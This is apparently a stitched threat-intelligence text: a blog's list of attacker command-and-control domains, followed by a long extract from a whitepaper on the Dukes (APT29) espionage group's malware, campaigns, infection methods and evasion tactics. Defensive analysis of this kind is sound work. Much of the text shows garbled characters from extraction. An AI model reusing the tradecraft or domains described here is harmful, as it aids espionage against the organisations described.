domains\\nnethostnet.com\\nhostsvcnet.com\\netcrem.net\\nmovieultimate.com\\nnewfilmts.com\\nfastdataexchange.org\\nliveweatherview.com\\nanalyticsbar.org\\nanalyticstest.net\\nlifeofmentalservice.com\\nmeteost.com\\nrighttopregnantpower.com\\nkiteim.org\\nadobe-flash-updates.org\\ngeneralsecurityscan.com\\nglobalresearching.org\\nlvueton.com\\naudiwheel.com\\nonline-reggi.com\\nfsportal.net\\nnetcorpscanprotect.com\\nmvband.net\\nmvtband.net\\nviters.org\\ntreepastwillingmoment.com\\nsendmevideo.org\\nsatellitedeluxpanorama.com\\nppcodecs.com\\nencoder-info.tk\\nwmdmediacodecs.com\\npostlkwarn.com\\nshcserv.com\\nversiontask.com\\nwebcdelivery.com\\nmiropc.org\\nsecurityprotectingcorp.com\\nuniquecorpind.com\\nappexsrv.net\\nadobeupgradeflash.com\\nAPT Backdoor Cyber espionage Nation State Sponsored Espionage Sofacy Targeted Attacks Vulnerabilities and exploits Zero-day vulnerabilities\\nShare post on:\\nFacebook\\nTwitter\\nRelated Posts\\nOperation AppleJeus Sequel\\nOilRig’s Poison Frog – old samples, same trick\\nKaspersky Security Bulletin 2019.

      "\"THE DUKES 7 years of Russian cyberespionage This whitepaper explores the tools - such as MiniDuke, CosmicDuke, OnionDuke, CozyDuke, etc- of the Dukes , a well-resourced, highly dedicated and organized cyberespionage group that we believe has been working for the Russian Federation since at least 2008 to collect intelligence in support of foreign and security policy decision-making.

The Dukes primarily target Western governments and related organizations, such as government ministries and agencies, political think tanks, and governmental subcontractors. Their targets have also included the governments of members of the Commonwealth of Independent States; Asian, African, and Middle Eastern governments; organizations associated with Chechen extremism; and Russian speakers engaged in the illicit trade of controlled substances and drugs. The Dukes are known to employ a vast arsenal of malware toolsets, which we identify as MiniDuke , CosmicDuke , OnionDuke , CozyDuke , CloudDuke , SeaDuke , HammerDuke , PinchDuke , and GeminiDuke . In recent years, the Dukes have engaged in apparently biannual large-scale spear-phishing campaigns against hundreds or even thousands of recipients associated with governmental institutions and a˚liated organizations. These campaigns utilize a smash-and-grab approach involving a fast but noisy break- in followed by the rapid collection and ex˛ltration of as much data as possible. If the compromised target is discovered to be of value, the Dukes will quickly switch the toolset used and move to using stealthier tactics focused on persistent compromise and long-term intelligence gathering. In addition to these large-scale campaigns, the Dukes continuously and concurrently engage in smaller, much more targeted campaigns, utilizing di˝erent toolsets. These targeted campaigns have been going on for at least 7 years. The targets and timing of these campaigns appear to align with the known foreign and security policy interests of the Russian Federation at those times. The Dukes rapidly react to research being published about their toolsets and operations. However, the group (or their sponsors) value their operations so highly that though they will attempt to modify their tools to evade detection and regain stealth, they will not cease operations to do so, but will instead incrementally modify their tools while continuing apparently as previously planned. In some of the most extreme cases, the Dukes have been known to engage in campaigns with unaltered versions of tools that only days earlier have been brought to the public™s attention by security companies and actively mentioned in the media. In doing so, the Dukes show unusual con˛dence in their ability to continue successfully compromising their targets even when their tools have been publicly exposed, as well as in their ability to operate with impunity. 4THE STORY OF THE DUKES 2008: Chechnya The earliest activity we have been able to de˜nitively attribute to the Dukes are two PinchDuke campaigns from November 2008. These campaigns use PinchDuke samples that were, according to their compilation timestamps, created on the 5 th and 12th of November 2008. The campaign identi˜ers found in these two samples are respectively, ﬁ alkavkaz.com20081105 ﬂ and ﬁcihaderi.net20081112 ﬂ.The ˜rst campaign identi˜er, found in the sample compiled on the 5 th, references alkavkaz.com , a domain associated with a Turkish website proclaiming to be the ﬁChechan sic Informational Centerﬂ (image 1, page 5). The second campaign identi˜er, from the sample compiled on the 12 th, references cihaderi.net , another Turkish website that claims to provide ﬁnews from the jihad worldﬂ and which dedicates a section of its site to Chechnya. Due to a lack of other PinchDuke samples from 2008 or earlier, we are unable to estimate when the Duke operation originally began. Based on our technical analysis of the known PinchDuke samples from 2008 however, we believe PinchDuke to have been under development by the summer of 2008. In fact, we believe that by the autumn of 2008, the Dukes were already developing not one but at least two distinct malware toolsets. This assertion is based on the oldest currently known sample of another Duke-related toolset, GeminiDuke , which was compiled on the 26 th of January 2009. This sample, like the early PinchDuke samples, appears to already be a ﬁfully-grownﬂ sample, which is why we believe GeminiDuke was under development by the autumn of 2008. That the Dukes were already developing and operating at least two distinct malware toolsets by the second half of 2008 suggests to us that either the size of their cyberespionage operation was already large enough to warrant such an arsenal of tools, or that they expected their operation to grow signi˜cantly enough in the foreseeable future to warrant the development of such an arsenal. We examine each of the Duke toolsets in greater detail later in the Tools and Techniques section (page 16). The story of the Dukes, as it is currently known, begins with a malware toolset that we call PinchDuke. This toolset consists of multiple loaders and an information-stealer trojan. Importantly, PinchDuke trojan samples always contain a notable text string, which we believe is used as a campaign identi˛er by the Dukes group to distinguish between multiple attack campaigns that are run in parallel. These campaign identi˛ers, which frequently specify both the date and target of the campaign, provide us with a tantalizing view into the early days of the Dukes. Etymology: a note on names The origins of the Duke toolset names can be traced back to when researchers at Kaspersky Labs coined the term ﬁMiniDukeﬂ to identify the ˛rst Duke-related malware they found. As explained in their whitepaper 7 , the researchers observed the surprisingly small MiniDuke backdoor being spread via the same exploit that was being used by a malware that they had already named ItaDuke; the ﬁDukeﬂ part of this malware™s name had in turn come about because it reminded the researchers of the notable Duqu threat. Despite the shared history of the name itself however, it is important to note that there is no reason to believe that the Duke toolsets themselves are in any way related to the ItaDuke malware, or to Duqu for that matter. As researchers continued discovering new toolsets that were created and used by the same group that had been operating MiniDuke, the new toolsets were also given ﬁDukeﬂ-derived names, and thus the threat actor operating the toolsets started to be commonly referred to as ﬁthe Dukesﬂ. The only other publicly used name for the threat actor that we are aware of is ﬁAPT29ﬂ 22 . Some exceptions to this naming convention do exist, and in the case of speci˛c Duke toolsets, other commonly used names are listed in the Tools and Techniques section (page 16). ItaDuke DuquMiniDuke PinchDuke CosmicDuke OnionDuke CozyDuke CloudDuke SeaDuke HammerDuke GeminiDuke ﬁdukeﬂ ﬁdukeﬂ The Dukes 52009: First known campaigns against the West Based on the campaign identi˜ers found in PinchDuke samples discovered from 2009, the targets of the Dukes group during that year included organizations such as the Ministry of Defense of Georgia and the ministries of foreign a˚airs of Turkey and Uganda. Campaign identi˜ers from 2009 also reveal that by that time, the Dukes were already actively interested in political matters related to the United States (US) and the North Atlantic Treaty Organization (NATO), as they ran campaigns targeting (among other organizations) a US-based foreign policy think tank, another set of campaigns related to a NATO exercise held in Europe, and a third set apparently targeting what was then known as the Georgian ﬁInformation Centre on NATOﬂ. Of these campaigns, two clusters in particular stand out. The ˜rst is a set of campaigns from the 16 th and 17th of April, 2009, that targeted a US-based foreign policy think tank, as well as government institutions in Poland and the Czech Republic (image 1, below). These campaigns utilized specially-crafted malicious Microsoft Word documents and PDF ˜les, which were sent as e-mail attachments to various personnel in an attempt to in˜ltrate the targeted organizations. We believe this cluster of campaigns had a joint goal of gathering intelligence on the sentiments of the targeted countries with respect to the plans being discussed at the time for the US to locate their ﬁEuropean Interceptor Siteﬂ missile defense base in Poland, with a related radar station that was intended to be located in the Czech Republic. Regarding the timing of these campaigns, it is curious to note that they began only 11 days after President Barack Obama gave a speech on the 5 th of April declaring his intention to proceed with the deployment of these missile defenses 1.The second notable cluster comprises of two campaigns that were possibly aimed at gathering information on Georgia-NATO relations. The ˜rst of these runs used the campaign identi˜er ﬁ natoinfo_ge ﬂ, an apparent reference to the www.natoinfo.ge website belonging to a Georgian political body that has since been renamed ﬁInformation Centre on NATO and EUﬂ. Although the campaign identi˜er itself doesn™t contain a date, we believe the campaign to have originated around the 7 th of June 2009, which was when the PinchDuke sample in question was compiled. This belief is based on the observation that in all of the other PinchDuke samples we have analyzed, the date of the campaign identi˜er has been within a day of the compilation date. The second campaign identi˜er, which we suspect may be related, is ﬁmod_ge_2009_07_03 ﬂ from a month later and apparently targeting the Ministry of Defense of Georgia.

The contents appear to have been copied from a BBC news article 3IMAGE 1: EARLY ACTIVITY FROM 2008 & 2009 62010: The emergence of CosmicDuke in the Caucasus The spring of 2010 saw continued PinchDuke campaigns against Turkey and Georgia, but also numerous campaigns against other members of the Commonwealth of Independent States such as Kazakhstan, Kyrgyzstan, Azerbaijan and Uzbekistan. Of these, the campaign with the identi˜er ﬁkaz_2010_07_30 ﬂ, which possibly targeted Kazakhstan, is of note because it is the last PinchDuke campaign we have observed. We believe that during the ˜rst half of 2010, the Dukes slowly migrated from PinchDuke and started using a new infostealer malware toolset that we call CosmicDuke .The ˜rst known sample of the CosmicDuke toolset was compiled on the 16 th of January 2010. Back then, CosmicDuke still lacked most of the credential-stealing functionality found in later samples. We believe that during the spring of 2010, the credential and ˜le stealing capabilities of PinchDuke were slowly ported to CosmicDuke , e˚ectively making PinchDuke obsolete. During this period of transition, CosmicDuke would often embed PinchDuke so that, upon execution, CosmicDuke would write to disk and execute PinchDuke . Both PinchDuke and CosmicDuke would then operate independently on the same compromised host, including performing separate information gathering, data ex˜ltration and communication with a command and control (C&C) server - although both malware would often use the same C&C server. We believe the purpose of this parallel use was to ‚˜eldtest™ the new CosmicDuke tool, while at the same time ensuring operational success with the tried-and-tested PinchDuke .During this period of CosmicDuke testing and development, the Duke authors also started experimenting with the use of privilege escalation vulnerabilities. Speci˜cally, on the 19 th of January 2010 security researcher Tavis Ormandy disclosed a local privilege escalation vulnerability (CVE-2010-0232) a˚ecting Microsoft Windows. As part of the disclosure, Ormandy also included the source code for a proof-of- concept exploit for the vulnerability 4 . Just 7 days later, on the 26th of January, a component for CosmicDuke was compiled that exploited the vulnerability and allowed the tool to operate with higher privileges. One loader to load them all (almost) In addition to all the other components being produced by the Dukes group, in 2010 they were also actively developing and testing a new loader - a component that wraps the core malware code and provides an additional layer of obfuscation. The ˛rst sample of this loader was compiled on the 26th of July 2010, making it a direct predecessor of what has since become known as the ﬁMiniDuke loaderﬂ, as later versions were extensively used by both MiniDuke and CosmicDuke. Some hints about the history of the ﬁMiniDuke loaderﬂ were noted in the CosmicDuke whitepaper we published 5 in 2014, where we observed that the loader appeared to have been in use with CosmicDuke before it was used with MiniDuke. In fact, we now know that before being used with either, the ﬁMiniDuke loaderﬂ was used to load PinchDuke. The ˛rst known sample of the loader was used during the summer of 2010, while the most recent samples were seen during the spring of 2015. This neatly ties together many of the tools used by the Dukes group, as versions of this one loader have been used to load malware from three di˝erent Dukes-related toolsets Œ CosmicDuke, PinchDuke, and MiniDuke Œ over the course of ˛ve years. 72011: John Kasai of Klagenfurt, Austria During 2011, the Dukes appear to have signi˜cantly expanded both their arsenal of malware toolsets and their C&C infrastructure. While the Dukes employed both hacked websites and purposely rented servers for their C&C infrastructure, the group rarely registered their own domain names, preferring instead to connect to their self- operated servers via IP addresses. The beginning of 2011 however saw a signi˜cant break from that routine, when a large grouping of domain names was registered by the Dukes in two batches; the ˜rst batch was registered on the 29 th of January and the second on the 13 th of February. All the domains in both batches were initially registered with the same alias: ﬁJohn Kasai of Klagenfurt, Austriaﬂ (image 2, above). These domains were used by the Dukes in campaigns involving many of their di˚erent malware toolsets all the way until 2014. Like the ﬁMiniDuke loaderﬂ, these ﬁJohn Kasaiﬂ domains also provide a common thread tying together much of the tools and infrastructure of the Dukes. 2011: Continuing expansion of the Dukes arsenal By 2011, the Dukes had already developed at least 3 distinct malware toolsets, including a plethora of supporting components such as loaders and persistence modules. In fact, as a sign of their arsenal™s breadth, they had already decided to retire one of these malware toolsets as obsolete after developing a replacement for it, seemingly from scratch. The Dukes continued the expansion of their arsenal in 2011 with the addition of two more toolsets: MiniDuke and CozyDuke . While all of the earlier toolsets Œ GeminiDuke , PinchDuke , and CosmicDuke Œ were designed around a core infostealer component, MiniDuke is centered on a simplistic backdoor component whose purpose is to enable the remote execution of commands on the compromised system. The ˜rst observed samples of the MiniDuke backdoor component are from May 2011. This backdoor component however is technically very closely related to GeminiDuke , to the extent that we believe them to share parts of their source code. The origins of MiniDuke can thus be traced back to the origins of GeminiDuke , of which the earliest observed sample was compiled in January of 2009. Unlike the simplistic MiniDuke toolset, CozyDuke is a highly versatile, modular, malware ﬁplatformﬂ whose functionality lies not in a single core component but in an array of modules that it may be instructed to download from its C&C server. These modules are used to selectively provide CozyDuke with just the functionality deemed necessary for the mission at hand. CozyDuke™s modular platform approach is a clear break from the designs of the previous Duke toolsets. The stylistic di˚erences between CozyDuke and its older siblings are further exempli˜ed by the way it was coded. All of the 4 previously mentioned toolsets were written in a minimalistic style commonly seen with malware; MiniDuke even goes as far as having many components written in Assembly language. CozyDuke however represents the complete opposite. Instead of being written in Assembly or C, it was written in C++ , which provides added layers of abstraction for the developer™s perusal, at the cost of added complexity. Contrary to what might be expected from malware, early CozyDuke versions also lacked any attempt at obfuscating or hiding their true nature. In fact, they were extremely open and verbose about their functionality - for example, early samples contained a plethora of logging messages in unencrypted form. In comparison, even the earliest known GeminiDuke samples encrypted any strings that might have given away the malware™s true nature. Finally, early CozyDuke versions also featured other elements that one would associate more with a traditional software development project than with malware. For instance, the earliest known CozyDuke version utilized a feature of the Microsoft Visual C++ compiler known as run-time error checking . This feature added automatic error checking to critical parts of the program™s execution at the cost, from a malware perspective, of providing additional hints that make the malware™s functionality easier for reverse engineers to understand. IMAGE 2: COMPARING WHOIS REGISTRATION DETAILS Left - Original whois registration details for natureinhome.com, one of the Duke C&C server domains registered on the 29th of January, 2011 to ﬁJohn Kasaiﬂ Right - Details for the domain were later changed, providing a small glimpse of the Dukes™ sense of humor 8Based on these and other similar stylistic di˚erences observed between CozyDuke and its older siblings, we speculate that while the older Duke families appear to be the work of someone with a background in malware writing (or at the least in hacking), CozyDuke ™s author or authors more likely came from a software development background. 2012: Hiding in the shadows We still know surprisingly few speci˜cs about the Dukes group™s activities during 2012. Based on samples of Duke malware from 2012, the Dukes do appear to have continued actively using and developing all of their tools. Of these, CosmicDuke and MiniDuke appear to have been in more active use, while receiving only minor updates. GeminiDuke and CozyDuke on the other hand appear to have been less used in actual operations, but did undergo much more signi˜cant development. 2013: MiniDuke ˚ies too close to the sunOn the 12th of February 2013, FireEye published a blogpost 6 alerting readers to a combination of new Adobe Reader 0-day vulnerabilities, CVE-2013-0640 and CVE-2013-0641, that were being actively exploited in the wild. 8 days after FireEye™s initial alert, Kaspersky spotted the same exploit being used to spread an entirely di˚erent malware family from the one mentioned in the original report. On 27 th February, Kaspersky 7 and CrySyS 8 Lab published research on this previously unidenti˜ed malware family, dubbing it MiniDuke . As we now know, by February 2013 the Dukes group had been operating MiniDuke and other toolsets for at least 4 and a half years. Their malware had not stayed undetected for those 4 and a half years. In fact, in 2009 a PinchDuke sample had been included in the malware set used by the AV-Test security product testing organization to perform anti-virus product comparison reviews. Until 2013 however, earlier Duke toolsets had not been put in a proper context. That ˜nally started to change in 2013. The MiniDuke samples that were spread using these exploits were compiled on the 20 th of February, after the exploit was already publicly known. One might argue that since this took place after the exploits were publicly mentioned, the Dukes simply copied them. We however do not believe so. As mentioned by Kaspersky, even though the exploits used for these MiniDuke campaigns were near-identical to those described by FireEye, there were nevertheless small di˚erences. Of these, the crucial one is the presence of PDB strings in the MiniDuke exploits. These strings, which are generated by the compiler when using speci˜c compilation settings, means that the components of the exploits used with MiniDuke had to have been compiled independently from those described by FireEye. We do not know whether the Dukes compiled the components themselves or whether someone else compiled the components before handing them to the group. This does however still rule out the possibility that the Dukes simply obtained copies of the exploit binaries described by FireEye and repurposed them. In our opinion, this insistence on using exploits that are already under heightened scrutiny suggests the existence of at least one of three circumstances. Firstly, the Dukes may have been con˜dent enough in their own abilities (and in the slowness of their opponents to react to new threats) that they did not care if their targets may already be on the lookout for anyone exploiting these vulnerabilities. Secondly, the value the Dukes intended to gain from these MiniDuke campaigns may have been so great that they deemed it worth the risk of getting noticed. Or thirdly, the Dukes may have invested so much into these campaigns that by the time FireEye published their alert, the Dukes felt they could not a˚ord to halt the campaigns. We believe all three circumstances to have coexisted at least to some extent. As will become evident in this report, this was not a one-o˚ case but a recurring theme with the Dukes, in that they would rather continue with their operations as planned than retreat from operating under the spotlight. IMAGE 3: MINIDUKE DECOY One of the Ukraine-themed decoy documents used during a MiniDuke campaign in February 2013 9As originally detailed in Kaspersky™s whitepaper, the MiniDuke campaigns from February 2013 employed spear-phishing emails with malicious PDF ˜le attachments. These PDFs would attempt to silently infect the recipient with MiniDuke, while distracting them by displaying a decoy document. The headings of these documents included ﬁUkraine™s NATO Membership Action Plan (MAP) Debatesﬂ, ﬁThe Informal Asia-Europe Meeting (ASEM) Seminar on Human Rightsﬂ, and ﬁUkraine™s Search for a Regional Foreign Policyﬂ (image 3, page 8). The targets of these campaigns, according to Kaspersky, were located variously in Belgium, Hungary, Luxembourg and Spain 7 . Kaspersky goes on to state that by obtaining log ˜les from the MiniDuke command and control servers, they were able to identify high-pro˜le victims from Ukraine, Belgium, Portugal, Romania, the Czech Republic, Ireland, the United States and Hungary 7 .2013: The curious case of OnionDuke After the February campaigns, MiniDuke activity appeared to quiet down, although it did not fully stop, for the rest of 2013. The Dukes group as a whole however showed no sign of slowing down. In fact, we saw yet another Duke malware toolset, OnionDuke , appear ˜rst in 2013. Like CozyDuke , OnionDuke appears to have been designed with versatility in mind, and takes a similarly modular platform approach. The OnionDuke toolset includes various modules for purposes such as password stealing, information gathering, denial of service (DoS) attacks, and even posting spam to the Russian social media network, VKontakte. The OnionDuke toolset also includes a dropper, an information stealer variant and multiple distinct versions of the core component that is responsible for interacting with the various modules. What makes OnionDuke especially curious is an infection vector it began using during the summer of 2013. To spread the toolset, the Dukes used a wrapper to combine OnionDuke with legitimate applications, created torrent ˜les containing these trojanized applications, then uploaded them to websites hosting torrent ˜les (image 4, above). Victims who used the torrent ˜les to download the applications would end up getting infected with OnionDuke .For most of the OnionDuke components we observed, the ˜rst versions that we are aware of were compiled during the summer of 2013, suggesting that this was a period of active development around this toolset. Critically however, the ˜rst sample of the OnionDuke dropper, which we have observed being used only with components of this toolset, was compiled on the 17 th of February 2013. This is signi˜cant because it suggests that OnionDuke was under development before any part of the Duke operation became public. OnionDuke™s development therefore could not have been simply a response to the outing of one of the other Duke malware, but was instead intended for use alongside the other toolsets. This indication that the Dukes planned to use an arsenal of 5 malware toolsets in parallel suggests that they were operating with both signi˜cant resources and capacity. 2013: The Dukes and Ukraine In 2013, many of the decoy documents employed by the Dukes in their campaigns were related to Ukraine; examples include a letter undersigned by the First Deputy Minister for Foreign A˚airs of Ukraine, a letter from the embassy of the Netherlands in Ukraine to the Ukrainian Ministry of Foreign a˚airs and a document titled ﬁUkraine™s Search for a Regional Foreign Policyﬂ. 9These decoy documents however were written before the start of the November 2013 Euromaidan protests in Ukraine and the subsequent upheaval. It is therefore important to note that, contrary to what might be assumed, we have actually observed a drop instead of an increase in Ukraine-related campaigns from the Dukes following the country™s political crisis. This is in stark contrast to some other suspected Russian threat actors (such as Operation Pawn Storm 10) who appear to have increased their targeting of Ukraine following the crisis. This supports our analysis that the overarching theme in the Dukes™ targeting is the collection of intelligence to support diplomatic e˚orts. The Dukes actively targeted Ukraine before the crisis, at a time when Russia was still weighing her options, but once Russia moved from diplomacy to direct action, Ukraine was no longer relevant to the Dukes in the same way. IMAGE 4: ONIONDUKE˙TROJANIZED TORRENT FILE Example of a torrent ˜le containing an executable trojanized with the OnionDuke toolset 102013: CosmicDuke™s war on drugs In a surprising turn of events, in September 2013 a CosmicDuke campaign was observed targeting Russian speakers involved in the trade of illegal and controlled substances (image 5, above). Kaspersky Labs, who sometimes refer to CosmicDuke as ‚Bot Gen Studio™, speculated that ﬁone possibility is that ‚Bot Gen Studio™ is a malware platform also available as a so-called ‚legal spyware™ toolﬂ; therefore, those using CosmicDuke to target drug dealers and those targeting governments are two separate entities 11. We however feel it is unlikely that the CosmicDuke operators targeting drug dealers and those targeting governments could be two entirely independent entities. A shared supplier of malware would explain the overlap in tools, but it would not explain the signi˜cant overlap we have also observed in operational techniques related to command and control infrastructure. Instead, we feel the targeting of drug dealers was a new task for a subset of the Dukes group, possibly due to the drug trade™s relevance to security policy issues. We also believe the tasking to have been temporary, because we have not observed any further similar targeting from the Dukes after the spring of 2014. 2014: MiniDuke™s rise from the ashes While MiniDuke activity decreased signi˜cantly during the rest of 2013 following the attention it garnered from researchers, the beginning of 2014 saw the toolset back in full force. All MiniDuke components, from the loader and downloader to the backdoor, had been slightly updated and modi˜ed during the downtime. Interestingly, the nature of these modi˜cations suggests that their primary purpose was to regain the element of stealth and undetectability that had been lost almost a year earlier. Of these modi˜cations, arguably the most important were the ones done to the loader. These resulted in a loader version that would later become known as the ﬁNemesis Gemina loaderﬂ due to PDB strings found in many of the samples. It is however still only an iteration on earlier versions of the MiniDuke loader. The ˜rst observed samples of the Nemesis Gemina loader (compiled on 14 th December 2013) were used to load the updated MiniDuke backdoor, but by the spring of 2014 the Nemesis Gemina loader was also observed in use with CosmicDuke .2014: CosmicDuke™s moment of fame and the scramble that ensued Following the MiniDuke expose, CosmicDuke in turn got its moment of fame when F-Secure published a whitepaper about it on 2 nd July 2014 5. The next day, Kaspersky also published their own research on the malware 11. It should be noted that until this point, even though CosmicDuke had been in active use for over 4 years, and had undergone minor modi˜cations and updates during that time, even the most recent CosmicDuke samples would often embed persistence components that date back to 2012. These samples would also contain artefacts of functionality from the earliest CosmicDuke samples from 2010. It is therefore valuable to observe how the Dukes reacted to CosmicDuke™s outing at the beginning of July. By the end of that month, CosmicDuke samples we found that had been compiled on the 30 th of July had shed unused parts of their code that had essentially just been relics of the past. Similarly, some of the hardcoded values that had remained unaltered in CosmicDuke samples for many years had been changed. We believe these edits were an attempt at evading detection by modifying or removing parts of the toolset that the authors believed might be helpful in identifying and detecting it. Concurrently with the alterations to CosmicDuke , the Dukes were also hard at work modifying their trusted loader. Much like the CosmicDuke toolset, the loader used by both MiniDuke and CosmicDuke had previously only undergone one major update (the Nemesis Gemina upgrade) since the ˜rst known samples from 2010. Again, much of the modi˜cation work focused on removing redundant code in an attempt to appear di˚erent from earlier versions of the loader. Interestingly however, another apparent evasion trick was also attempted - forging of the loaders™ compilation timestamps. IMAGE 5: COSMICDUKE DECOY Screenshot of a decoy document appearing to be an order for growth hormones, which was used in a CosmicDuke campaign in September 2013 11The ˜rst CosmicDuke sample we observed after the initial research on CosmicDuke was a sample compiled on the 30th of July 2014. The loader used by the sample purported to have been compiled on the 25 th of March 2010. Due to artefacts left in the loader during compilation time however, we know that it used a speci˜c version of the Boost library, 1.54.0, that was only published on the 1 st of July 2013 12. The compilation timestamp therefore had to have been faked. F-Secure™s whitepaper 5 on CosmicDuke includes a timeline of the loader™s usage, based on compilation timestamps. Perhaps the Dukes group thought that by faking a timestamp from before the earliest one cited in the whitepaper, they might be able to confuse researchers. During the rest of 2014 and the spring of 2015, the Dukes continued making similar evasion-focused modi˜cations to CosmicDuke , as well as experimenting with ways to obfuscate the loader. In the latter case however, the group appear to have also simultaneously developed an entirely new loader, which we ˜rst observed being used in conjunction with CosmicDuke during the spring of 2015. While it is not surprising that the Dukes reacted to multiple companies publishing extensive reports on one of their key toolsets, it is valuable to note the manner in which they responded. Much like the MiniDuke expose in February 2013, the Dukes again appeared to prioritize continuing operations over staying hidden. They could have ceased all use of CosmicDuke (at least until they had developed a new loader) or retired it entirely, since they still had other toolsets available. Instead, they opted for minimal downtime and attempted to continue operations, with only minor modi˜cations to the toolset. 2014: CozyDuke and monkey videos While we now know that CozyDuke had been under development since at least the end of 2011, it was not until the early days of July 2014 that the ˜rst large-scale CozyDuke campaign that we are aware of took place. This campaign, like later CozyDuke campaigns, began with spear-phishing emails that tried to impersonate commonly seen spam emails. These spear-phishing emails would contain links that eventually lead the victim to becoming infected with CozyDuke .Some of the CozyDuke spear-phishing emails from early July posed as e-fax arrival noti˜cations, a popular theme for spam emails, and used the same ﬁUS letter fax test pageﬂ decoy document that was used a year later by CloudDuke . In at least one case however, the email instead contained a link to a zip-archive ˜le named ﬁO˛ce Monkeys LOL Video.zipﬂ, which was hosted on the DropBox cloud storage service. What made this particular case interesting was that instead of the usual dull PDF ˜le, the decoy was a Flash video ˜le, more speci˜cally a Super Bowl advertisement from 2007 purporting to show monkeys at an o˛ce (image 6, above). 2014: OnionDuke gets caught using a malicious Tor node On the 23 rd of October 2014, Leviathan Security Group published a blog post describing a malicious Tor exit node they had found. They noted that this node appeared to be maliciously modifying any executables that were downloaded through it over a HTTP connection. Executing the modi˜ed applications obtained this way would result in the victim being infected with unidenti˜ed malware. On the 14 th of November, F-Secure published a blog post naming the malware OnionDuke and associating it with MiniDuke and CosmicDuke , the other Duke toolsets known at the time 13.Based on our investigations into OnionDuke , we believe that for about 7 months, from April 2014 to when Leviathan published their blog post in October 2014, the Tor exit node identi˜ed by the researchers was being used to wrap executables on-the-˝y with OnionDuke (image 7, page 13). This is similar to the way in which the toolset was being spread via trojanized applications in torrent ˜les during the summer of 2013. While investigating the OnionDuke variant being spread by the malicious Tor node, we also identi˜ed another OnionDuke variant that appeared to have successfully compromised multiple victims in the ministry of foreign a˚airs of an Eastern European country during the spring of 2014. This variant di˚ered signi˜cantly in functionality from the one being spread via the Tor node, further suggesting that di˚erent OnionDuke variants are intended for di˚erent kinds of victims. IMAGE 6: COZYDUKE DECOYS Left - US letter fax test decoy used in CozyDuke campaigns Right - Screenshot of the monkey video decoy also used by CozyDuke 12We believe that, unusually, the purpose of the OnionDuke variant spread via the Tor node was not to pursue targeted attacks but instead to form a small botnet for later use. This OnionDuke variant is related to the one seen during the summer of 2013 being spread via torrent ˜les. Both of these infection vectors are highly indiscriminate and untargeted when compared to spear-phishing, the usual infection vector of choice for the Dukes. Further, the functionality of the OnionDuke variant is derived from a number of modules. While one of these modules gathers system information and another attempts to steal the victim™s usernames and passwords, as one would expect from a malware used for a targeted attack, the other two known OnionDuke modules are quite the opposite; one is designed for use in DoS attacks and the other for posting predetermined messages to the Russian VKontakte social media site. This sort of functionality is more common in criminality-oriented botnets, not state-sponsored targeted attacks. We have since been able to identify at least two separate OnionDuke botnets. We believe the formation of the ˜rst of these botnets began in January 2014, using both unidenti˜ed infection vectors and the known malicious Tor node, and continued until our blogpost was published in November. We believe the formation of the second botnet began in August 2014 and continued until January 2015. We have been unable to identify the infection vectors used for this second botnet, but the C&C servers it used had open directory listings, allowing us to retrieve ˜les containing listings of victim IP addresses. The geographic distribution of these IP addresses (image 8, page 13) further supports our theory that the purpose of this OnionDuke variant was not targeted attacks against high-pro˜le targets. One theory is that the botnets were a criminal side business for the Dukes group. The size of the botnet however (about 1400 bots) is very small if its intended use is for commercial DoS attacks or spam-sending. Alternatively, OnionDuke also steals user credentials from its victims, providing another potential revenue source. The counter to that argument however is that the value of stolen credentials from users in the countries with the highest percentage of OnionDuke bots (Mongolia and India) are among the lowest on underground markets. 2015: The Dukes up the ante The end of January 2015 saw the start of the most high- volume Duke campaign seen thus far, with thousands of recipients being sent spear-phishing emails that contained links to compromised websites hosting CozyDuke . Curiously, the spear-phishing emails were strikingly similar to the e-fax themed spam usually seen spreading ransomware and other common crimeware. Due to the sheer number of recipients, it may not have been possible to customize the emails in the same way as was possible with lower-volume campaigns. The similarity to common spam may however also serve a more devious purpose. It is easy to imagine a security analyst, burdened by the amount of attacks against their network, dismissing such common-looking spam as ﬁjust another crimeware spam runﬂ, allowing the campaign to, in essence, hide in the masses 14 . The CozyDuke activity continues one of the long-running trends of the Dukes operations, the use of multiple malware toolsets against a single target. In this case, the Dukes ˜rst attempted to infect large numbers of potential targets with CozyDuke (and in a more obvious manner than previously seen). They would then use the toolset to gather initial information on the victims, before deciding which ones to pursue further. For the victims deemed interesting enough, the Dukes would then deploy a di˚erent toolset. We believe the primary purpose of this tactic is an attempt at evading detection in the targeted network. Even if the noisy initial CozyDuke campaign is noticed by the victim organization, or by someone else who then makes it publicly known, defenders will begin by ˜rst looking for indicators of compromise (IOCs) related to the CozyDuke toolset. If however by that time the Dukes are already operating within the victim™s network, using an another toolset with di˚erent IOCs, then it is reasonable to assume that it will take much longer for the victim organization to notice the in˜ltration. In previous cases, the group used their malware toolsets interchangeably, as either the initial or a later-stage toolset in a campaign. For these CozyDuke campaigns however, the Dukes appear to have employed two particular later-stage toolsets, SeaDuke and HammerDuke , that were purposely designed to leave a persistent backdoor on the compromised network. HammerDuke is a set of backdoors that was ˜rst seen in the wild in February 2015, while SeaDuke is a cross- platform backdoor that was, according to Symantec, ˜rst spotted in the wild in October 2014 15. Both toolsets were originally spotted being deployed by CozyDuke to its victims. What makes SeaDuke special is that it was written in Python and designed to work on both Windows and Linux systems; it is the ˜rst cross-platform tool we have seen from the Dukes. One plausible reason for developing such a ˝exible malware might be that the group were increasingly encountering victim environments where users were using Linux as their desktop operating system. Meanwhile, HammerDuke is a Windows-only malware (written in .NET) and comes in two variants. The simpler one will connect to a hardcoded C&C server over HTTP or HTTPS to download commands to execute. The more advanced variant, on the other hand, will use an algorithm to generate a periodically-changing Twitter account name and will then attempt to ˜nd tweets from that 13284 21% MONGOLIA 326 23% INDIA 260 19% OTHER 235 17% UNKNOWN 100 7%PAKISTAN 64 5%ALGERIA 58 4%MOROCCO 62 4%EGYPT , 43TURKEY , 38USA , 39INDONESIA , 34SAUDI ARABIA , 25 BRAZIL , 22 PHILIPPINES , 16SRI LANKA , 15BANGLADESH , 14 NEPAL , 13CAMBODIA , 13CHINA, 123% EACH 2% EACH 1% EACH IMAGE 8: GEOGRAPHICAL DISTRIBUTION OF ONIONDUKE BOTNET TOTAL: 1389 ONIONDUKE DROPPER ONIONDUKE CORE COMPONENT ONIONDUKE DROPPER ONIONDUKE CORE COMPONENT ONIONDUKE CORE COMPONENT Drops Drops Drops Original binary Original binary Original binary Executes MALICIOUS TOR EXIT NODEVICTIM Request Response Wrapped binary IMAGE 7: FLOWCHART OF HOW ONIONDUKE USES MALICIOUS TOR NODE TO INFECT VICTIMS 14account containing links to the actual download location of the commands to execute. In this way, the advanced 